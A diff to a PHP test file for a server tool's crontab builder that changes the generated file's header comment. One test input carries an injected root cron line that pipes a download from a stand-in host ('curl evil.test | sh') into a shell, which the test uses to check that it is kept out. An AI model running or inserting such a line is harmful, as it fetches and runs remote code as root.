@@ -99,7 +99,7 @@ function cronRemoval(): string
 
 test('an app cron entry runs as root, feeding its script to a shell that runs as the app user with its environment, path and sandbox', function () {
     expect(app(CrontabBuilder::class)->build(scheduledApp()))
-        ->toBe("# Coresmith managed crons for shop - do not edit manually\n" . cronLine('* * * * *', 0) . "\n");
+        ->toBe("# Managed by Coresmith for shop. Change these jobs on the app page.\n" . cronLine('* * * * *', 0) . "\n");
 });
 
 test('a cron run leaves the work it started in the background running when the command returns', function () {
@@ -136,7 +136,7 @@ test('a rails cron run gets the production defaults the app units get, before th
     $application = scheduledApp(['type' => ApplicationType::Ruby, 'framework' => 'rails', 'php_version' => null, 'ruby_version' => '3.3.6']);
 
     expect(app(CrontabBuilder::class)->build($application))->toBe(
-        "# Coresmith managed crons for shop - do not edit manually\n"
+        "# Managed by Coresmith for shop. Change these jobs on the app page.\n"
         . '* * * * * root systemd-run --quiet --wait --pipe --collect --service-type=exec --uid=coresmith-app-shop --gid=coresmith-app-shop'
         . " -p 'WorkingDirectory=/var/coresmith/apps/shop/current'"
         . " -E 'RAILS_ENV=production' -E 'RACK_ENV=production' -E 'RAILS_SERVE_STATIC_FILES=1' -E 'RAILS_LOG_TO_STDOUT=1'"
@@ -160,7 +160,7 @@ test('a command a person typed never reaches the cron file, whatever it contains
         ['schedule' => '0 3 * * 1-5', 'command' => "true\n* * * * * root curl evil.test | sh"],
     ]]));
 
-    expect($file)->toBe("# Coresmith managed crons for shop - do not edit manually\n" . cronLine('*/5 * * * *', 0) . "\n" . cronLine('0 3 * * 1-5', 1) . "\n")
+    expect($file)->toBe("# Managed by Coresmith for shop. Change these jobs on the app page.\n" . cronLine('*/5 * * * *', 0) . "\n" . cronLine('0 3 * * 1-5', 1) . "\n")
         ->and($file)->not->toContain('%')
         ->and($file)->not->toContain('whoami')
         ->and($file)->not->toContain('artisan')
@@ -311,7 +311,7 @@ test('an entry with no command is left out rather than written as an empty scrip
     $application = scheduledApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => '  '], ['schedule' => '0 3 * * *', 'command' => 'php artisan backup:run']]]);
 
     expect(app(CrontabBuilder::class)->scripts($application))->toBe(['/etc/coresmith/cron/shop/0.sh' => cronScript('php artisan backup:run')])
-        ->and(app(CrontabBuilder::class)->build($application))->toBe("# Coresmith managed crons for shop - do not edit manually\n" . cronLine('0 3 * * *', 0) . "\n");
+        ->and(app(CrontabBuilder::class)->build($application))->toBe("# Managed by Coresmith for shop. Change these jobs on the app page.\n" . cronLine('0 3 * * *', 0) . "\n");
 });
 
 test('removing an app cron file names the file and user through their checks', function (array $attributes, string $message) {
@@ -370,7 +370,7 @@ test('the cron file is written from the jobs as saved now, not the copy the call
 
     expect($transport->uploads())->toBe([
         '/etc/coresmith/cron/.shop.new/0.sh' => cronScript('php artisan backup:run'),
-        '/etc/cron.d/.coresmith-app-shop.new' => "# Coresmith managed crons for shop - do not edit manually\n" . cronLine('0 3 * * *', 0) . "\n",
+        '/etc/cron.d/.coresmith-app-shop.new' => "# Managed by Coresmith for shop. Change these jobs on the app page.\n" . cronLine('0 3 * * *', 0) . "\n",
     ]);
 });
 
